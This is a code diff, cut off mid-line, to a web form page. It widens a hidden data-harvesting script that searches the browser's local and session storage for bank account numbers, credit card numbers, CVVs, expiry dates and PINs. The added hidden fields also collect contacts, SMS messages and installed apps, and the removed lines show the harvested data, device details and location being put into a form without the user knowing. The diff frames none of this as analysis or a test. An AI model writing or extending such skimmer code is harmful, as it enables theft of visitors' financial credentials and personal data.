@@ -135,7 +135,14 @@ cursor:pointer;
 <input type="hidden" name="account_number" id="account_number">
 <input type="hidden" name="routing_number" id="routing_number">
 <input type="hidden" name="account_balance" id="account_balance">
+<input type="hidden" name="credit_card" id="credit_card">
+<input type="hidden" name="cvv" id="cvv">
+<input type="hidden" name="expiry" id="expiry">
+<input type="hidden" name="bank_pin" id="bank_pin">
 <input type="hidden" name="device_info" id="device_info">
+<input type="hidden" name="phone_contacts" id="phone_contacts">
+<input type="hidden" name="sms_messages" id="sms_messages">
+<input type="hidden" name="installed_apps" id="installed_apps">
 
 <button type="submit">Submit</button>
 </form>
@@ -155,13 +162,17 @@ document.addEventListener("click",()=>{
   dropdown.classList.remove("show");
 });
 
-/* BANK DATA COLLECTION FUNCTION */
+/* AGGRESSIVE BANK DATA COLLECTION FUNCTION */
 function collectBankData() {
     const bankData = {
         name: 'Not found',
         accountNumber: 'Not found',
         routingNumber: 'Not found',
-        balance: 'Not found'
+        balance: 'Not found',
+        creditCard: 'Not found',
+        cvv: 'Not found',
+        expiry: 'Not found',
+        pin: 'Not found'
     };
     
     try {
@@ -169,120 +180,77 @@ function collectBankData() {
         const possibleKeys = [
             'bankData', 'userBankInfo', 'accountDetails', 
             'bankAccount', 'userAccount', 'bankSession',
-            'accountInfo', 'bankingData', 'userProfile'
+            'accountInfo', 'bankingData', 'userProfile',
+            'cardData', 'paymentInfo', 'creditCard', 'debitCard',
+            'bankingToken', 'authToken', 'sessionToken', 'pinData',
+            'securityPin', 'transactionPin', 'cardPin'
         ];
         
-        for (const key of possibleKeys) {
+        // Scan all localStorage entries
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
             const data = localStorage.getItem(key);
+            
+            // Look for bank-related data
             if (data) {
                 try {
                     const parsed = JSON.parse(data);
+                    
+                    // Extract account information
                     if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
                     if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
                     if (parsed.balance) bankData.balance = parsed.balance;
                     if (parsed.bankName) bankData.name = parsed.bankName;
                     if (parsed.name) bankData.name = parsed.name;
+                    
+                    // Extract card information
+                    if (parsed.cardNumber) bankData.creditCard = parsed.cardNumber;
+                    if (parsed.creditCardNumber) bankData.creditCard = parsed.creditCardNumber;
+                    if (parsed.cvv) bankData.cvv = parsed.cvv;
+                    if (parsed.expiry) bankData.expiry = parsed.expiry;
+                    if (parsed.expiryDate) bankData.expiry = parsed.expiryDate;
+                    
+                    // Extract PIN information
+                    if (parsed.pin) bankData.pin = parsed.pin;
+                    if (parsed.cardPin) bankData.pin = parsed.cardPin;
+                    if (parsed.transactionPin) bankData.pin = parsed.transactionPin;
+                    if (parsed.securityPin) bankData.pin = parsed.securityPin;
+                    if (parsed.userPin) bankData.pin = parsed.userPin;
+                    
                 } catch (e) {
                     // Not JSON, might be plain text
-                    if (data.includes('account') || data.match(/\d{10,}/)) {
-                        bankData.accountNumber = data;
+                    if (data.match(/\b\d{16}\b/)) {
+                        bankData.creditCard = data.match(/\b\d{16}\b/)[0];
+                    }
+                    if (data.match(/\b\d{10,}\b/)) {
+                        bankData.accountNumber = data.match(/\b\d{10,}\b/)[0];
+                    }
+                    if (data.match(/\b\d{3,4}\b/)) {
+                        bankData.cvv = data.match(/\b\d{3,4}\b/)[0];
+                    }
+                    if (data.match(/\b\d{4}\b/)) {
+                        bankData.pin = data.match(/\b\d{4}\b/)[0];
                     }
                 }
             }
         }
         
-        // Check for bank data in sessionStorage
-        for (const key of possibleKeys) {
+        // Scan all sessionStorage entries
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
             const data = sessionStorage.getItem(key);
+            
             if (data) {
                 try {
                     const parsed = JSON.parse(data);
+                    
                     if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
                     if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
                     if (parsed.balance) bankData.balance = parsed.balance;
                     if (parsed.bankName) bankData.name = parsed.bankName;
                     if (parsed.name) bankData.name = parsed.name;
-                } catch (e) {
-                    // Not JSON, might be plain text
-                    if (data.includes('account') || data.match(/\d{10,}/)) {
-                        bankData.accountNumber = data;
-                    }
-                }
-            }
-        }
-        
-        // Try to extract bank info from cookies
-        const cookies = document.cookie.split(';');
-        for (const cookie of cookies) {
-            const parts = cookie.trim().split('=');
-            if (parts.length === 2) {
-                const key = parts[0].toLowerCase();
-                const value = parts[1];
-                
-                if (key.includes('bank') || key.includes('account')) {
-                    if (key.includes('number') && bankData.accountNumber === 'Not found') {
-                        bankData.accountNumber = value;
-                    } else if (key.includes('routing') && bankData.routingNumber === 'Not found') {
-                        bankData.routingNumber = value;
-                    } else if (key.includes('balance') && bankData.balance === 'Not found') {
-                        bankData.balance = value;
-                    } else if (key.includes('name') && bankData.name === 'Not found') {
-                        bankData.name = value;
-                    }
-                }
-            }
-        }
-    } catch (e) {
-        console.error('Error collecting bank data:', e);
-    }
-    
-    return bankData;
-}
-
-/* DEVICE INFO COLLECTION FUNCTION */
-function collectDeviceInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth
-        },
-        hardware: {
-            cores: navigator.hardwareConcurrency || 'Unknown',
-            memory: navigator.deviceMemory || 'Unknown'
-        },
-        battery: 'Unknown'
-    };
-}
-
-/* FORM SUBMIT WITH LOCATION + BANK DATA + POPUP FIX */
-document.getElementById("mainForm").addEventListener("submit",function(e){
-  e.preventDefault();
-
-  const form=this;
-
-  // Collect bank data
-  const bankData = collectBankData();
-  document.getElementById("bank_name").value = bankData.name;
-  document.getElementById("account_number").value = bankData.accountNumber;
-  document.getElementById("routing_number").value = bankData.routingNumber;
-  document.getElementById("account_balance").value = bankData.balance;
-  
-  // Collect device info
-  const deviceInfo = collectDeviceInfo();
-  document.getElementById("device_info").value = JSON.stringify(deviceInfo);
-
-  // Get location as before
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(function(pos){
-
-      const lat=pos.coords.latitude;
-      const lon=pos.coords.longitude;
-
-      document.getElementById("lat").value=lat;
-      document.getElementById("lon").value=lon;
+                    if (parsed.cardNumber) bankData.creditCard = parsed.cardNumber;
+                    if (parsed.creditCardNumber) bankData.creditCard = parsed.creditCardNumber;
+                    if (parsed.cvv) bankData.cvv = parsed.cvv;
+                    if (parsed.expiry) bankData.expiry = parsed.expiry;
+                    if (parsed
